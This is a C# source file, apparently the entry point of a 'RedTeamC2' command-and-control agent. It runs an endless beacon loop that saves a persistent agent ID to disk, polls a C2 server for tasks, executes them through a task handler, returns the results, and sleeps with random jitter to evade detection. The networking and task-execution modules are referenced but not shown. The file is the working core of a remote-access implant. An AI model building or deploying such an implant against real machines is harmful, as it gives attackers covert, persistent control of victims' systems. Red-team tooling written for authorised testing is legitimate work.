// Program.cs
// Main entry point for the RedTeamC2 C# Agent (beacon loop)

using System;
using System.IO;
using System.Threading;
using Agent.Utils;

namespace Agent
{
    class Program
    {
        static string agentIdFile = "agent_id.txt";
        static string agentId = null;
        static void Main(string[] args)
        {
            Logger.Log("Agent started.");
            agentId = GetOrCreateAgentId();
            var http = new HttpManager(agentId);
            var random = new Random();
            while (true)
            {
                try
                {
                    string task = http.Beacon();
                    if (!string.IsNullOrEmpty(task))
                    {
                        Logger.Log($"Received task: {task}");
                        string result = TaskHandler.Handle(task, http);
                        http.SendResult(result);
                    }
                }
                catch (Exception ex)
                {
                    Logger.Log($"Beacon error: {ex.Message}");
                }
                int sleep = random.Next(10000, 30000); // 10-30s jitter
                Logger.Log($"Sleeping for {sleep / 1000} seconds.");
                Thread.Sleep(sleep);
            }
        }
        static string GetOrCreateAgentId()
        {
            if (File.Exists(agentIdFile))
                return File.ReadAllText(agentIdFile);
            string id = Guid.NewGuid().ToString();
            File.WriteAllText(agentIdFile, id);
            return id;
        }
    }
}
